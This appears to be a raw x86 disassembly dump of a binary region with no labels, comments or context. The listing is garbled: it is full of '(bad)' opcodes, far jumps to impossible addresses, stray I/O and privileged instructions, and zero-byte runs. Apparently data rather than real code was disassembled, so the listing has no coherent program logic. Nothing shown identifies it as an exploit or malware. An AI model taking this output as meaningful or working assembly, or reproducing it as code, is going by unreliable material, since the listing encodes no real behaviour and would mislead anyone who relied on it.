  42a55d:	add    bl,BYTE PTR [edx+0x44]
  42a560:	clc    
  42a561:	push   es
  42a562:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a563:	adc    al,0x24
  42a565:	ret    0xd0e8
  42a568:	lods   eax,DWORD PTR ds:[esi]
  42a569:	aad    0xb6
  42a56b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a56c:	imul   edi,DWORD PTR [edx-0x4aac6f1a],0x11
  42a573:	mov    DWORD PTR ds:0x7d55e206,ebx
  42a579:	add    DWORD PTR [edx],esi
  42a57b:	dec    edx
  42a57c:	pop    ss
  42a57d:	add    DWORD PTR [ebx+0x15a87fe0],esp
  42a583:	sbb    DWORD PTR [edi],edx
  42a585:	aad    0x4e
  42a587:	pop    ecx
  42a588:	jle    0x42a58c
  42a58a:	jmp    0x3e287c92
  42a58f:	ret    0x7bd4
  42a592:	std    
  42a593:	int    0x0
  42a595:	add    BYTE PTR [eax],al
  42a597:	add    BYTE PTR [eax],al
  42a599:	aam    0xcd
  42a59b:	call   FWORD PTR [eax-0x71275f8c]
  42a5a1:	or     eax,0x74a9b2fc
  42a5a6:	loope  0x42a570
  42a5a8:	xchg   edi,ebp
  42a5aa:	std    
  42a5ab:	inc    ecx
  42a5ac:	sub    bl,BYTE PTR [eax-0x6a]
  42a5af:	and    esp,ebp
  42a5b1:	pop    esi
  42a5b2:	mov    ds,WORD PTR [edx]
  42a5b4:	pop    es
  42a5b5:	mov    BYTE PTR [ecx-0x5],dl
  42a5b8:	jne    0x42a5d4
  42a5ba:	add    eax,0xb185be8
  42a5bf:	sti    
  42a5c0:	sub    cl,dl
  42a5c2:	xchg   esp,ebp
  42a5c4:	cmp    ah,bh
  42a5c6:	(bad)  
  42a5c7:	or     edi,DWORD PTR [edx]
  42a5c9:	retf   
  42a5ca:	mov    bl,0x65
  42a5cc:	jmp    0x29e:0x6abeefbd
  42a5d3:	je     0x42a5ec
  42a5d5:	mov    ecx,0xfd311d94
  42a5da:	xacquire xchg BYTE PTR [ecx+eiz*8],ch
  42a5de:	test   eax,eax
  42a5e0:	fdivp  st(2),st
  42a5e2:	add    DWORD PTR [ecx],eax
  42a5e4:	jmp    0x3642eb5f
  42a5e9:	jns    0x42a5ed
  42a5eb:	add    BYTE PTR [eax-0x16fffd9d],al
  42a5f1:	cmp    edi,eax
  42a5f3:	sti    
  42a5f4:	jmp    0x9302a86f
  42a5f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a5fa:	inc    ebx
  42a5fb:	inc    ebp
  42a5fc:	jne    0x42a5fe
  42a5fe:	add    BYTE PTR [eax],al
  42a600:	add    BYTE PTR [eax],al
  42a602:	jbe    0x42a606
  42a604:	add    BYTE PTR [ecx],ch
  42a606:	pop    esp
  42a607:	add    eax,0x26aacc3
  42a60c:	add    cl,ch
  42a60e:	test   BYTE PTR [eax+0x21ce545],0x3
  42a615:	jmp    0x1009590
  42a61a:	cmc    
  42a61b:	add    eax,DWORD PTR [eax+eax*1]
  42a61e:	dec    esp
  42a61f:	sub    eax,eax
  42a621:	jg     0x42a68b
  42a623:	push   0x2e
  42a625:	test   DWORD PTR [edi+esi*2+0x55c3d2a],ebx
  42a62c:	add    BYTE PTR [eax],al
  42a62e:	call   0x4e42e244
  42a633:	add    al,0x0
  42a635:	je     0x42a67a
  42a637:	xor    ebx,edi
  42a639:	add    bl,BYTE PTR [esp+eax*1]
  42a63c:	jne    0x42a5e1
  42a63e:	push   es
  42a63f:	add    ah,bl
  42a641:	add    dh,dh
  42a643:	pop    es
  42a644:	push   ebx
  42a645:	jmp    0x42a670
  42a647:	xor    ebx,edi
  42a649:	add    al,0x1c
  42a64b:	add    al,0x74
  42a64d:	or     esp,DWORD PTR [ecx+0x6]
  42a650:	(bad)  
  42a651:	dec    DWORD PTR [eax+eax*4]
  42a654:	and    BYTE PTR [ebx],bh
  42a656:	push   ds
  42a657:	jb     0x42a5dc
  42a659:	xor    edx,DWORD PTR [edi]
  42a65b:	dec    eax
  42a65c:	or     BYTE PTR gs:[ebx-0x3d2c1cad],al
  42a663:	jmp    0x43325e
  42a668:	add    BYTE PTR [eax],al
  42a66a:	add    BYTE PTR [edx+eax*4],cl
  42a66d:	out    dx,al
  42a66e:	jne    0x42a633
  42a670:	add    BYTE PTR [ebp+0x10],0x59
  42a674:	(bad)  
  42a675:	jae    0x42a6f1
  42a677:	push   ebp
  42a678:	cs loop 0x42a6f1
  42a67b:	jbe    0x42a67e
  42a67d:	jecxz  0x42a649
  42a67f:	xchg   BYTE PTR [edx],al
  42a681:	call   0xf72c693d
  42a686:	test   esp,ecx
  42a688:	jb     0x42a68e
  42a68a:	adc    DWORD PTR [esp+ebp*8-0x3990fd1e],0xffffff82
  42a692:	dec    ebp
  42a693:	nop
  42a694:	(bad)  
  42a695:	call   0x24dc1b9d
  42a69a:	add    esp,edi
  42a69c:	xchg   DWORD PTR es:[edx+0x71],ecx
  42a6a0:	sahf   
  42a6a1:	inc    ebx
  42a6a2:	jne    0x42a712
  42a6a4:	xchg   esp,eax
  42a6a5:	ror    BYTE PTR [edi],0xf0
  42a6a8:	fmul   DWORD PTR [edi+0x2a10fc40]
  42a6ae:	cmp    eax,0x399dd
  42a6b3:	jne    0x42a701
  42a6b5:	lods   eax,DWORD PTR ds:[esi]
  42a6b6:	(bad)  
  42a6b7:	cmp    ebp,DWORD PTR [esi+0x13]
  42a6ba:	sti    
  42a6bb:	test   al,0x21
  42a6bd:	daa    
  42a6be:	and    bl,BYTE PTR [ebp+0x3583ff19]
  42a6c4:	xchg   ebp,eax
  42a6c5:	cli    
  42a6c6:	xchg   BYTE PTR [ebx],dh
  42a6c8:	add    al,0xeb
  42a6ca:	xchg   BYTE PTR [eax+0xfb8029],dl
  42a6d0:	add    BYTE PTR [eax],al
  42a6d2:	add    BYTE PTR [eax],al
  42a6d4:	adc    DWORD PTR [ecx],0xc751516
  42a6da:	mov    edi,0x8a1fedff
  42a6df:	cmp    bh,al
  42a6e1:	aas    
  42a6e2:	mov    ecx,DWORD PTR [esi+edi*8]
  42a6e5:	pop    edi
  42a6e6:	daa    
  42a6e7:	jmp    0x42a743
  42a6e9:	sbb    edi,edi
  42a6eb:	push   edx
  42a6ec:	int    0xca
  42a6ee:	cmc    
  42a6ef:	stc    
  42a6f0:	shl    dh,cl
  42a6f2:	sub    ebp,DWORD PTR [ebx+ebp*2+0x67]
  42a6f6:	push   ss
  42a6f7:	jg     0x42a6a6
  42a6f9:	outs   dx,DWORD PTR ds:[esi]
  42a6fa:	mov    dh,0x59
  42a6fc:	push   ds
  42a6fd:	bound  eax,QWORD PTR [ebp+0xc]
  42a700:	jne    0x42a6a8
  42a702:	ds je  0x42a76f
  42a705:	pushf  
  42a706:	push   ss
  42a707:	sti    
  42a708:	sub    DWORD PTR [ebx-0x7e],eax
  42a70b:	jl     0x42a75e
  42a70d:	sbb    eax,0x9c4673ff
  42a712:	xchg   edx,eax
  42a713:	and    edi,DWORD PTR [ebp+0x2]
  42a716:	jmp    0xeed01ca9
  42a71b:	lods   eax,DWORD PTR ds:[esi]
  42a71c:	daa    
  42a71d:	paddb  mm7,QWORD PTR [edi-0x7d]
  42a721:	ret    0x2ee8
  42a724:	jnp    0x42a733
  42a726:	mov    ebp,0xb50d7adf
  42a72b:	fbstp  TBYTE PTR [edx-0x4e]
  42a72e:	inc    eax
  42a72f:	ins    BYTE PTR es:[edi],dx
  42a730:	fld    QWORD PTR [edx]
  42a732:	jmp    0xfdcedcb7
  42a737:	add    BYTE PTR [eax],0x0
  42a73a:	add    BYTE PTR [eax],al
  42a73c:	add    BYTE PTR [edi-0x69],al
  42a73f:	hlt    
  42a740:	sbb    ah,BYTE PTR [eax+0x2]
  42a743:	test   bl,0x32
  42a746:	jnp    0x42a72b
  42a748:	cs jae 0x42a6d2
  42a74b:	sti    
  42a74c:	mov    ?,WORD PTR [ebp+eax*2-0x1d]
  42a750:	mov    dl,0x1a
  42a752:	push   cs
  42a753:	jmp    0x2750e4de
  42a758:	or     esi,DWORD PTR [ebp-0x49]
  42a75b:	ins    DWORD PTR es:[edi],dx
  42a75c:	sub    BYTE PTR [edx+0x4a146db4],dh
  42a762:	sub    DWORD PTR [esi],ecx
  42a764:	adc    eax,0x1a65b969
  42a769:	out    dx,al
  42a76a:	xchg   esi,eax
  42a76b:	sub    bl,bl
  42a76d:	inc    ecx
  42a76e:	cli    
  42a76f:	xor    al,0xc3
  42a771:	mov    ds:0x7b8fecac,al
  42a776:	jns    0x42a75b
  42a778:	lods   eax,DWORD PTR ds:[esi]
  42a779:	enter  0x35b0,0x2c
  42a77d:	xor    al,0x9a
  42a77f:	call   0x36179987
  42a784:	xchg   DWORD PTR [eax],edi
  42a786:	cli    
  42a787:	cmp    BYTE PTR [ecx+0x18f097af],dh
  42a78d:	addr16 or eax,0xc2688fd4
  42a793:	(bad)  
  42a794:	call   0xe4b6e9ac
  42a799:	scas   eax,DWORD PTR es:[edi]
  42a79a:	mov    es,WORD PTR [edi]
  42a79c:	fld    QWORD PTR [edi+0xed7584]
  42a7a2:	add    BYTE PTR [eax],al
  42a7a4:	add    BYTE PTR [eax],al
  42a7a6:	cdq    
  42a7a7:	sbb    al,0x74
  42a7a9:	repnz (bad) 
  42a7ab:	idiv   edi
  42a7ad:	stc    
  42a7ae:	ss or  eax,0xf391ef88
  42a7b4:	xchg   BYTE PTR [esi],ah
  42a7b6:	mov    dl,dh
  42a7b8:	xchg   BYTE PTR [edx+edi*2+0x74b5bed5],ch
  42a7bf:	inc    ecx
  42a7c0:	add    BYTE PTR [esi+0x6a000276],bh
  42a7c6:	test   eax,0xebb25a09
  42a7cb:	dec    esi
  42a7cc:	or     cl,ch
  42a7ce:	fild   DWORD PTR [ebx-0x4d186714]
  42a7d4:	xchg   al,bh
  42a7d6:	fwait
  42a7d7:	adc    BYTE PTR [esi+eiz*4-0x7],dh
  42a7db:	pop    es
  42a7dc:	sti    
  42a7dd:	jne    0x42a817
  42a7df:	mov    edi,fs
  42a7e1:	jmp    0x558aa4d8
  42a7e6:	imul   edi,DWORD PTR [edx+0xf231674],0xdd75c253
  42a7f0:	mov    edi,0x2e0c9029
  42a7f5:	test   eax,0xe1458426
  42a7fa:	dec    edi
  42a7fb:	mov    esp,0x1a74624f
  42a800:	les    ecx,FWORD PTR [esi]
  42a802:	jns    0x42a806
  42a804:	test   BYTE PTR [ecx-0x20050416],ch
  42a80a:	add    BYTE PTR [eax],al
  42a80c:	add    BYTE PTR [eax],al
  42a80e:	add    bl,bh
  42a810:	xchg   esi,eax
  42a811:	test   DWORD PTR [ecx-0x6006],0x74bf8c8c
  42a81b:	xchg   ecx,eax
  42a81c:	jge    0x42a863
  42a81e:	clc    
  42a81f:	test   DWORD PTR ds:0x1c80ff84,0x158c15f6
  42a829:	cmp    eax,DWORD PTR [eax]
  42a82b:	add    eax,0xe10ae302
  42a830:	jmp    0x4f:0x2930673
  42a837:	dec    esp
  42a838:	add    BYTE PTR [ebx-0x38],bh
  42a83b:	fwait
  42a83c:	dec    ecx
  42a83d:	enter  0x60c2,0x0
  42a841:	test   esi,esi
  42a843:	add    BYTE PTR [edi],ah
  42a845:	jp     0x42a845
  42a847:	fwait
  42a848:	jnp    0x42a863
  42a84a:	push   edi
  42a84b:	(bad)  
  42a84c:	sub    DWORD PTR [edi+edi*8-0x387cfaf0],eax
  42a853:	je     0x42a7f0
  42a855:	pop    ebp
  42a856:	add    BYTE PTR [ebx+edx*2],cl
  42a859:	jecxz  0x42a872
  42a85b:	cmp    edx,ebp
  42a85d:	not    BYTE PTR [esi+0x74]
  42a860:	adc    BYTE PTR [esi+edi*8],bl
  42a863:	sbb    esi,DWORD PTR [eax]
  42a865:	mov    ebx,0xc081cf5f
  42a86a:	je     0x42a87e
  42a86c:	int    0xff
  42a86e:	push   esi
  42a86f:	fdiv   st(7),st
  42a871:	inc    DWORD PTR [edx+0x0]
  42a877:	add    BYTE PTR [esp+esi*8],dl
  42a87a:	mov    edx,0x80da6755
  42a87f:	in     al,dx
  42a880:	in     al,0x1
  42a882:	add    BYTE PTR [eax],al
  42a884:	jae    0x42a8fd
  42a886:	jge    0x42a8a0
  42a888:	sub    DWORD PTR [ecx-0xbe40208],eax
  42a88e:	dec    edi
  42a88f:	mov    edx,DWORD PTR [ecx+0x7530e7fe]
  42a895:	pop    ss
  42a896:	(bad)  
  42a897:	dec    DWORD PTR [edx-0x5b]
  42a89a:	inc    ebx
  42a89b:	je     0x42a826
  42a89d:	test   BYTE PTR [ecx+0x1ba6e813],dl
  42a8a3:	std    
  42a8a4:	xchg   edx,eax
  42a8a5:	xchg   esp,eax
  42a8a6:	adc    dh,BYTE PTR [ebp+0x79]
  42a8a9:	jmp    0xa4c2dfd9
  42a8ae:	adc    cl,cl
  42a8b0:	mov    dh,0x90
  42a8b2:	rcl    BYTE PTR [ebx],0xf8
  42a8b5:	fmul   DWORD PTR [edi-0x55e6cdff]
  42a8bb:	jmp    DWORD PTR [edx+0x19]
  42a8be:	jle    0x42a888
  42a8c0:	pop    edx
  42a8c1:	sar    BYTE PTR [esi],cl
  42a8c3:	xchg   DWORD PTR [ecx+0x4a51fffd],edi
  42a8c9:	push   ebp
  42a8ca:	fisttp DWORD PTR [edi]
  42a8cc:	out    dx,al
  42a8cd:	ins    BYTE PTR es:[edi],dx
  42a8ce:	fist   DWORD PTR [edi]
  42a8d0:	cmp    dh,BYTE PTR [ebp-0x25]
  42a8d3:	nop    DWORD PTR [ecx+0x15]
  42a8d7:	sti    
  42a8d8:	sub    bl,BYTE PTR [ebx+0x3e]
  42a8db:	xchg   DWORD PTR [eax],eax
  42a8dd:	add    BYTE PTR [eax],al
  42a8df:	add    BYTE PTR [eax],al
  42a8e1:	mov    ecx,0x1a52fb3d
  42a8e6:	xchg   ebp,eax
  42a8e7:	ficom  DWORD PTR [ebx]
  42a8e9:	(bad)  
  42a8ea:	xchg   esp,eax
  42a8eb:	ficom  DWORD PTR [ebx]
  42a8ed:	or     dl,BYTE PTR [ebp-0x5ff2f026]
  42a8f3:	adc    ebx,edi
  42a8f5:	cli    
  42a8f6:	retf   
  42a8f7:	xchg   DWORD PTR ds:[ecx],edi
  42a8fa:	std    
  42a8fb:	or     edx,DWORD PTR [edx-0x2]
  42a8fe:	mov    ah,0xdf
  42a900:	pop    es
  42a901:	int    0xda
  42a903:	adc    bh,bl
  42a905:	(bad)  
  42a907:	xchg   DWORD PTR ds:[ecx],edi
  42a90a:	std    
  42a90b:	pop    es
  42a90c:	xchg   DWORD PTR [ecx],edi
  42a90e:	add    eax,0x1c25300
  42a913:	sbb    eax,0x1d776ee0
  42a918:	loopne 0x42a8a4
  42a91a:	sbb    ch,BYTE PTR [eax+0x2a0aae15]
  42a920:	inc    ebx
  42a921:	dec    eax
  42a922:	ja     0x42a8b9
  42a924:	test   BYTE PTR [ecx+0x7503e6f9],cl
  42a92a:	mov    bl,0x5d
  42a92c:	cwde   
  42a92d:	jp     0x42a9ac
  42a92f:	sbb    eax,DWORD PTR fs:[eax-0xc4c9df6]
  42a936:	(bad)  
  42a937:	lock sub eax,DWORD PTR [esp+eax*1]
  42a93b:	jmp    0x29c17743
  42a940:	pop    DWORD PTR [esi+0x1b6c77]
  42a946:	add    BYTE PTR [eax],al
  42a948:	add    BYTE PTR [eax],al
  42a94a:	pop    eax
  42a94b:	or     bh,BYTE PTR [edx]
  42a94d:	mov    bl,0x5a
  42a94f:	pusha  
  42a950:	rol    BYTE PTR [ebx],0x75
  42a953:	jle    0x42a97e
  42a955:	(bad)  
  42a956:	jbe    0x42a92d
  42a958:	sub    BYTE PTR [edx+edi*8-0x7b],cl
  42a95c:	xor    DWORD PTR [esi],edx
  42a95e:	cmp    al,0x46
  42a960:	mov    esp,0xfd84198a
  42a965:	repnz and BYTE PTR [edx],cl
  42a968:	jmp    0x8ef46e1f
  42a96d:	add    al,BYTE PTR [eax]
  42a96f:	nop
  42a970:	lock mov ch,0x90
  42a973:	mov    ds:0x1aaa997e,eax
  42a978:	cdq    
  42a979:	pop    ds
  42a97a:	dec    BYTE PTR [ecx]
  42a97c:	inc    ebx
  42a97d:	mov    esi,DWORD PTR [edi-0x7b]
  42a980:	stos   DWORD PTR es:[edi],eax
  42a981:	add    bh,BYTE PTR [esi]
  42a983:	(bad)  
  42a984:	mov    ebx,0x6fa122d1
  42a989:	mov    edi,0xf4247ddc
  42a98e:	mov    ds:0xe96a002d,eax
  42a993:	add    eax,0x80c23401
  42a998:	jo     0x42a98b
  42a99a:	lea    ecx,[eax]
  42a99c:	cs xchg edi,eax
  42a99e:	cli    
  42a99f:	jg     0x42a991
  42a9a1:	xchg   esp,eax
  42a9a2:	or     BYTE PTR ds:0x1ec28150,0xfb
  42a9a9:	xchg   cl,ah
  42a9ab:	jbe    0x42a9f2
  42a9ad:	add    DWORD PTR [eax],0x0
  42a9b3:	leave  
  42a9b4:	add    dl,0xcf
  42a9b7:	mov    cl,BYTE PTR [ecx]
  42a9b9:	sti    
  42a9ba:	pop    ss
  42a9bb:	push   0xb6fbe7ef
  42a9c0:	or     DWORD PTR [ecx+ebp*1+0x6c8c9c05],eax
  42a9c7:	add    DWORD PTR [edi],0xc294efb
  42a9cd:	adc    eax,0xffc965d1
  42a9d2:	jno    0x42a995
  42a9d4:	ja     0x42a95b
  42a9d6:	cmp    DWORD PTR [edx+0xd],esp
  42a9d9:	sti    
  42a9da:	pusha  
  42a9db:	cmp    bh,cl
  42a9dd:	ss xor ebp,esp
  42a9e0:	mov    bh,0x86
  42a9e2:	pushf  
  42a9e3:	jp     0x42a966
  42a9e5:	jne    0x42a9c8
  42a9e7:	cmc    
  42a9e8:	inc    esp
  42a9e9:	cli    
  42a9ea:	push   0x63
  42a9ec:	or     bl,ah
  42a9ee:	je     0x42aa65
  42a9f0:	or     eax,0x86b5c2fb
  42a9f5:	cmp    DWORD PTR [edx-0x66ae4c3b],ebx
  42a9fb:	imul   ecx,DWORD PTR [edi+0xbc43a0f],0xc8e64915
  42aa05:	call   DWORD PTR [ecx]
  42aa07:	xor    al,0x8c
  42aa09:	and    eax,0x98c7c12
  42aa0e:	add    BYTE PTR [ecx+0x1],ah
  42aa11:	xor    BYTE PTR [eax],bh
  42aa13:	xchg   ebp,eax
  42aa14:	out    dx,eax
  42aa15:	jae    0x42aa1d
  42aa17:	add    BYTE PTR [eax],al
  42aa19:	add    BYTE PTR [eax],al
  42aa1b:	add    bh,al
  42aa1d:	lds    edi,FWORD PTR [edx+ebx*1+0x54]
  42aa21:	or     al,0x65
  42aa23:	add    ah,BYTE PTR [edx+esi*4-0x75]
  42aa27:	inc    eax
  42aa28:	pushf  
  42aa29:	in     eax,dx
  42aa2a:	je     0x42aa34
  42aa2c:	add    ebx,DWORD PTR [eax]
  42aa2e:	aaa    
  42aa2f:	push   ss
  42aa30:	dec    esp
  42aa31:	(bad)  
  42aa32:	sub    al,al
  42aa34:	bswap  ecx
  42aa36:	or     eax,DWORD PTR [eax-0x19]
  42aa39:	add    ch,BYTE PTR [ebx]
  42aa3b:	shl    BYTE PTR [ebx+0x50],0x52
  42aa3f:	leave  
  42aa40:	iret   
  42aa41:	xor    DWORD PTR [ebx-0x44cdb0c0],edi
  42aa47:	ret    
  42aa48:	sub    DWORD PTR [ebx-0x14],edi
  42aa4b:	xor    DWORD PTR [eax-0x28a8aed1],0x70
  42aa52:	pop    ss
  42aa53:	push   edi
  42aa54:	mov    bl,0x78
  42aa56:	adc    ebp,DWORD PTR [edx+0x5c]
  42aa59:	pop    edx
  42aa5a:	sti    
  42aa5b:	dec    BYTE PTR [ecx]
  42aa5d:	cld    
  42aa5e:	out    0x30,eax
  42aa60:	xchg   edx,eax
  42aa61:	out    dx,al
  42aa62:	test   BYTE PTR [ebx+0x14c4825c],0x99
  42aa69:	cmc    
  42aa6a:	jae    0x42aadb
  42aa6c:	lahf   
  42aa6d:	in     eax,dx
  42aa6e:	div    BYTE PTR [esi+esi*8+0x7a]
  42aa72:	dec    BYTE PTR [ecx+eiz*8-0x3300af39]
  42aa79:	out    dx,al
  42aa7a:	adc    al,0xfc
  42aa7c:	sub    eax,0x84fb44
  42aa81:	add    BYTE PTR [eax],al
  42aa83:	add    BYTE PTR [eax],al
  42aa85:	dec    esp
  42aa86:	js     0x42aa94
  42aa88:	mov    ecx,DWORD PTR [ecx+0x16]
  42aa8b:	jecxz  0x42aa60
  42aa8d:	shl    ebx,1
  42aa8f:	test   BYTE PTR [ebx-0x18f09e8b],0x2e
  42aa96:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42aa97:	enter  0x45f7,0x8e
  42aa9b:	enter  0x25d7,0x48
  42aa9f:	stc    
  42aaa0:	retf   
  42aaa1:	fld    DWORD PTR fs:[ebx]
  42aaa4:	test   DWORD PTR [ebp+0x40faf3cd],esi
  42aaaa:	or     DWORD PTR [eax-0x669752bb],eax
  42aab0:	or     eax,DWORD PTR [ebp+0x70]
  42aab3:	stc    
  42aab4:	ret    
  42aab5:	test   cl,bl
  42aab7:	add    eax,DWORD PTR [edi+0x4d7b5530]
  42aabd:	imul   ebx,DWORD PTR [ebx+eiz*1+0x4a21323],0x41d027f
  42aac8:	jne    0x42ab3a
  42aaca:	xchg   esp,eax
  42aacb:	mov    es,WORD PTR [edi]
  42aacd:	pop    esi
  42aace:	sbb    edx,edx
  42aad0:	cli    
  42aad1:	cmc    
  42aad2:	das    
  42aad3:	repz add al,ch
  42aad6:	and    DWORD PTR [eax],eax
  42aad8:	xor    BYTE PTR [ebp+0x19],0xff
  42aadc:	popa   
  42aadd:	cld    
  42aade:	sbb    DWORD PTR [edx-0x3e],edi
  42aae1:	stos   BYTE PTR es:[edi],al
  42aae2:	outs   dx,DWORD PTR ds:[esi]
  42aae3:	cmp    al,0xbf
  42aae5:	test   al,0xa4
  42aae7:	pop    ds
  42aae8:	add    DWORD PTR [eax],0x0
  42aaee:	dec    ecx
  42aaef:	adc    DWORD PTR ds:0xb94c7500,eax
  42aaf5:	xchg   BYTE PTR [eax-0x1f],ah
  42aaf8:	hlt    
  42aaf9:	aas    
  42aafa:	jne    0x42aaa0
  42aafc:	sub    ebp,DWORD PTR [eax-0x23]
  42aaff:	mov    ebx,es
  42ab01:	jmp    DWORD PTR [edi+0x35853908]
  42ab07:	xchg   al,bh
  42ab09:	xchg   BYTE PTR [edx+0x771a0821],bh
  42ab0f:	add    ch,cl
  42ab11:	add    eax,DWORD PTR [ebp+0x7]
  42ab14:	push   esp
  42ab15:	cld    
  42ab16:	out    dx,eax
  42ab17:	in     al,dx
  42ab18:	push   0x9902a2f5
  42ab1d:	add    al,0xd2
  42ab1f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ab20:	push   eax
  42ab21:	push   eax
  42ab22:	add    edx,eax
  42ab24:	call   0x6c727adf
  42ab29:	inc    ebx
  42ab2a:	dec    eax
  42ab2b:	cli    
  42ab2c:	pop    ebp
  42ab2d:	retf   0x8372
  42ab30:	test   eax,0xf279bf9
  42ab35:	push   es
  42ab36:	sbb    eax,0xa2c3654e
  42ab3b:	mov    bl,0x89
  42ab3d:	clc    
  42ab3e:	push   ss
  42ab3f:	repz sub BYTE PTR [eax+edi*8],al
  42ab43:	inc    ecx
  42ab44:	hlt    
  42ab45:	xlat   BYTE PTR ds:[ebx]
  42ab46:	adc    bh,dh
  42ab48:	out    0x3,eax
  42ab4a:	jne    0x42aacf
  42ab4c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42ab4d:	add    eax,0x5873b22a
  42ab52:	add    BYTE PTR [eax],al
  42ab54:	add    BYTE PTR [eax],al
  42ab56:	add    BYTE PTR [ebp+0x8],ch
  42ab59:	pop    edx
  42ab5a:	adc    ch,dl
  42ab5c:	cmp    dl,BYTE PTR [edx+0x1b]
  42ab5f:	jne    0x42ab3f
  42ab61:	dec    edx
  42ab62:	adc    dh,al
  42ab64:	inc    edx
  42ab65:	ret    
  42ab66:	jmp    0x42ab63
  42ab68:	cmp    al,0x99
  42ab6a:	jle    0x42ab22
  42ab6c:	cli    
  42ab6d:	jmp    0x42ab58
  42ab6f:	jbe    0x42ab73
  42ab71:	jmp    0xf0d2eb29
  42ab76:	sbb    esp,edx
  42ab78:	out    0x1a,al
  42ab7a:	adc    dh,al
  42ab7c:	inc    edx
  42ab7d:	pushf  
  42ab7e:	gs push ebx
  42ab80:	inc    edx
  42ab81:	stos   DWORD PTR es:[edi],eax
  42ab82:	scas   al,BYTE PTR es:[edi]
  42ab83:	sub    eax,0xc203ed41
  42ab88:	rcr    DWORD PTR ds:0xfffeaccc,1
  42ab8e:	in     eax,0xed
  42ab90:	pop    edi
  42ab91:	add    cl,ch
  42ab93:	jbe    0x42ab2f
  42ab95:	mov    edi,0xfa05b975
  42ab9a:	hlt    
  42ab9b:	push   ds
  42ab9c:	repz aas 
  42ab9e:	jmp    0xaa79ac02
  42aba3:	je     0x42ac23
  42aba5:	nop
  42aba6:	jmp    0x21aaae21
  42abab:	into   
  42abac:	add    eax,0x8c143fb
  42abb1:	xor    eax,0xffc57bb9
  42abb6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42abb7:	stos   BYTE PTR es:[edi],al
  42abb8:	xor    DWORD PTR [esi],ecx
  42abba:	sub    DWORD PTR [eax],eax
  42abbc:	add    BYTE PTR [eax],al
  42abbe:	add    BYTE PTR [eax],al
  42abc0:	jno    0x42ac3d
  42abc2:	inc    edx
  42abc3:	loope  0x42ab76
  42abc5:	inc    esp
  42abc6:	je     0x42abc5
  42abc8:	fnstsw WORD PTR [ebp+edi*1-0x57]
  42abcc:	mov    eax,ebp
  42abce:	call   DWORD PTR [eax]
  42abd0:	pop    ecx
  42abd1:	jbe    0x42ac13
  42abd3:	jmp    0x973d7c3d
  42abd8:	clc    
  42abd9:	mov    bh,0x7
  42abdb:	rcr    DWORD PTR [edx-0x1016bf8a],1
  42abe1:	ret    
  42abe2:	add    edx,DWORD PTR [esi+0x3f]
  42abe5:	or     bl,dl
  42abe7:	bound  esi,QWORD PTR [edi]
  42abe9:	std    
  42abea:	addr16 cmp ebp,esi
  42abed:	sar    edi,0x6f
  42abf0:	ss std 
  42abf2:	cli    
  42abf3:	jmp    DWORD PTR [ebp+0x31]
  42abf6:	xchg   DWORD PTR [edi+0x73ff9d3e],ebx
  42abfc:	cmp    DWORD PTR ds:0x82aa888,eax
  42ac02:	xor    dl,BYTE PTR [esi]
  42ac04:	pop    esp
  42ac05:	jge    0x42ac51
  42ac07:	loope  0x42aba8
  42ac09:	ret    
  42ac0a:	sldt   WORD PTR [edi+0x355f0338]
  42ac11:	pop    ecx
  42ac12:	push   DWORD PTR [ebx+0x23]
  42ac15:	cmp    BYTE PTR [ebx+0x8],dl
  42ac18:	or     BYTE PTR [edi],0x38
  42ac1b:	pop    eax
  42ac1c:	call   0x347bb88d
  42ac21:	push   cs
  42ac22:	outs   dx,DWORD PTR ds:[esi]
  42ac23:	or     BYTE PTR [eax],al
  42ac25:	add    BYTE PTR [eax],al
  42ac27:	add    BYTE PTR [eax],al
  42ac29:	jg     0x42abe9
  42ac2b:	aas    
  42ac2c:	mov    DWORD PTR [edx+0x6cc352fa],edx
  42ac32:	out    0x77,al
  42ac34:	sbb    DWORD PTR [edx],ecx
  42ac36:	repnz mov BYTE PTR [esi-0x2c],bl
  42ac3a:	icebp  
  42ac3b:	sub    eax,0xd54a1ff
  42ac40:	inc    eax
  42ac41:	pushf  
  42ac42:	xchg   DWORD PTR ds:0xba55dc32,edx
  42ac48:	mov    edx,DWORD PTR [edx+0x6]
  42ac4b:	dec    esi
  42ac4c:	add    eax,0xfffffcb2
  42ac51:	ins    BYTE PTR es:[edi],dx
  42ac52:	mov    bl,0x3
  42ac54:	add    DWORD PTR [eax+eax*1+0x6ca1ff4f],ebx
  42ac5b:	adc    BYTE PTR [eax-0x74],al
  42ac5e:	jnp    0x42ac20
  42ac60:	jne    0x42acc5
  42ac62:	cs mov ebx,0xffffd4e9
  42ac68:	call   edi
  42ac6a:	inc    ecx
  42ac6b:	add    ecx,DWORD PTR [ebx+0x57031c20]
  42ac71:	ffree  st(0)
  42ac73:	adc    eax,0xe8005c02
  42ac78:	outs   dx,BYTE PTR ds:[esi]
  42ac79:	dec    esi
  42ac7a:	repz test BYTE PTR [ebp-0x74229374],0xea
  42ac82:	pop    es
  42ac83:	mov    bl,0xff
  42ac85:	mov    esi,edx
  42ac87:	jbe    0x42ac12
  42ac89:	jne    0x42ac25
  42ac8b:	into   
  42ac8c:	add    DWORD PTR [eax],eax
  42ac8e:	add    BYTE PTR [eax],al
  42ac90:	add    BYTE PTR [eax],al
  42ac92:	jne    0x42acad
  42ac94:	jl     0x42ace0
  42ac96:	jge    0x42ac2a
  42ac98:	jge    0x42acce
  42ac9a:	jae    0x42acb5
  42ac9c:	inc    DWORD PTR [esi+0x2eb421bb]
  42aca2:	push   ds
  42aca3:	mov    ds:0x197b3866,eax
  42aca8:	inc    DWORD PTR [esi-0x6783eecd]
  42acae:	mov    eax,ds:0xeeffff13
  42acb3:	(bad)  
  42acb5:	mov    ch,ch
  42acb7:	fld    DWORD PTR [ecx]
  42acb9:	add    BYTE PTR [ebp-0x70],dh
  42acbc:	rol    DWORD PTR [edi],0xba
  42acbf:	cdq    
  42acc0:	mov    DWORD PTR [ecx],0x41975
  42acc6:	jne    0x42ace1
  42acc8:	jbe    0x42ad0c
  42acca:	jge    0x42ac5e
  42accc:	imul   ecx,DWORD PTR [eax+0x7b],0x19
  42acd0:	inc    DWORD PTR [esi-0x3731decd]
  42acd6:	sbb    edx,DWORD PTR [edx+0x1973507b]
